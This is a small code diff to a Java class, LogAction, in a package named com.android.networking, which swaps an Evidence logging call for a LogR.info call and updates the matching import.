@@ -13,7 +13,8 @@ import com.android.networking.Trigger;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfAction;
 import com.android.networking.conf.ConfigurationException;
-import com.android.networking.evidence.Evidence;
+
+import com.android.networking.evidence.LogR;
 import com.android.networking.util.Check;
 
 // TODO: Auto-generated Javadoc
@@ -41,7 +42,7 @@ public class LogAction extends SubAction {
 	 */
 	@Override
 	public boolean execute(Trigger trigger) {
-		Evidence.info(msg);
+		LogR.info(msg);
 
 		return true;
 	}
